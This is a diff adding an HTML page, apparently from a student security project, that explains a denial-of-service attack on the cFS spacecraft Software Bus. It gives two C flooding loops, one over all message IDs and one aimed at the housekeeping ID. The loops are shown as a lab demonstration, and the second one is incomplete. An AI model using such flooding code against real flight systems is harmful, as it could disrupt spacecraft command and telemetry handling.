@@ -1,0 +1,105 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SpaceCyber</title>
+    <link rel="stylesheet" href="styles.css">
+    <link href="https://fonts.googleapis.com/css2?family=Orbitron&display=swap" rel="stylesheet">
+    <!-- <script src="scripts.js"></script> -->
+</head>
+
+<body>
+    <header id="page-header"></header>
+    <script async src="header.js"></script>
+
+    <div class="content-container dos" id="dos">
+        <div class="dos-heading">Denial of Service Attack on the Software Bus</div>
+        <div class="dos-content">
+            <div class="text-block paragraph2">
+                This attack's purpose is to stop other applications from receiving any and 
+                all commands through the software bus the same way denial of service attacks 
+                work on the internet. These attacks would be more vulnerable on satellites 
+                because of how they work if they don't take proper security measures.
+            </div>
+            <div class="text-block paragraph2">
+                The Core Flight System (cFS) Software Bus Network (SBN) application facilitates 
+                communication and data exchange between various software components within a 
+                spacecraft. It functions as a central messaging hub, enabling components to 
+                publish and subscribe to messages without direct knowledge of each other's location 
+                or implementation details. The SBN utilizes a publish-subscribe model, where 
+                components can publish messages to specific topics, and other components can 
+                subscribe to those topics to receive relevant messages. The SBN ensures reliable 
+                message delivery through a combination of buffering, acknowledgments, and retransmission
+                mechanisms. Components interact with the SBN using a well-defined API, which simplifies 
+                the integration of new components into the system. By providing a flexible and efficient 
+                communication framework, the SBN plays a crucial role in enabling complex spacecraft 
+                systems to operate seamlessly.
+            </div>
+            <div class="text-block paragraph1">Two theories:</div>
+            <div class="text-block paragraph1">1. Flood all pipes with random messages</div>
+            <div class="text-blcok paragraph2">* Context: Message ID’s can range from 0-65535. Pipes are configured 
+                to choose what ID’s to accept and will only process messages with this specific ID. All others are 
+                ignored by this pipe.
+            </div>
+            <div>
+                <code>
+                    for (uint16_t mid = 0; mid <= 0xFFFF; mid++) {
+
+                        // Create a message with the current MID
+                        CFE_SB_MsgId_t messageId = CFE_SB_ValueToMsgId(mid);
+                        CFE_SB_InitMsg(&SERVER_APP_Data.EchoPacket.TlmHeader.Msg, messageId, sizeof(SERVER_APP_Data.EchoPacket));
+                   
+                           // Populate the message content
+                           strncpy(SERVER_APP_Data.EchoPacket.Message, MESSAGE, 80);
+                   
+                           // Timestamp the message
+                           CFE_SB_TimeStampMsg(&SERVER_APP_Data.EchoPacket.TlmHeader.Msg);
+                   
+                           // Send the message
+                           CFE_SB_TransmitMsg(&SERVER_APP_Data.EchoPacket.TlmHeader.Msg, true);
+                   
+                           OS_printf("SERVER: Message sent with MID: 0x%04X\n", mid);
+                       }
+                </code>
+            </div>
+            <div class="text-block paragraph2">
+                This code runs the actual attack. For now It is just placed in the main function of our server application. 
+                In the real world, we would have to figure out a way to execute this code on the satellite.
+            </div>
+            <div class="text-block paragraph1">2. Flood one important pipe with messages</div>
+            <div class="text-block paragraph2">
+                This attack uses the same code with slight adjustments. Instead of iterating 
+                through all the message ID’s we target a specific ID, in this case the houseKeeping 
+                message ID. We then proceed to continuously send messages on this pipe forcing 
+                the software bus to discard the oldest message on the queue without processing it 
+                completing the attack.
+            </div>
+            <div>
+                <code>
+                    CFE_MSG_Init(&SERVER_APP_Data.EchoPacket.TlmHeader.Msg,CFE_SB_ValueToMsgId(SAMPLE_APP_SEND_HK_MID), sizeof(SERVER_APP_Data.EchoPacket));
+
+                    for (uint16_t mid = 0; mid <= 0xFFFF; mid++) {
+
+                        // Populate the message content
+                        strncpy(SERVER_APP_Data.EchoPacket.Message, MESSAGE, 80);
+
+                        // Timestamp the message
+                        CFE_SB_TimeStampMsg(&SERVER_APP_Data.EchoPacket.TlmHeader.Msg);
+
+                        // Send the message
+                        CFE_SB_TransmitMsg(&SERVER_APP_Data.EchoPacket.TlmHeader.Msg, true);
+
+                        OS_printf("SERVER: Message sent with MID: 0x%04X\n", mid);
+                        OS_printf("SERVER: iteration: 0x%d\n", mid);
+                </code>
+            </div>
+            <div class="text-block paragraph2">
+                Some specifications we want to note is that the pipe depth has to be considered. 
+                Pipe depth determines how many messages can be on a pipe at a time. Overwhelming 
+                pipes with a large pipe depth can be more challenging and require more resources.
+            </div>
+        </div>
+    </div>
+</body>
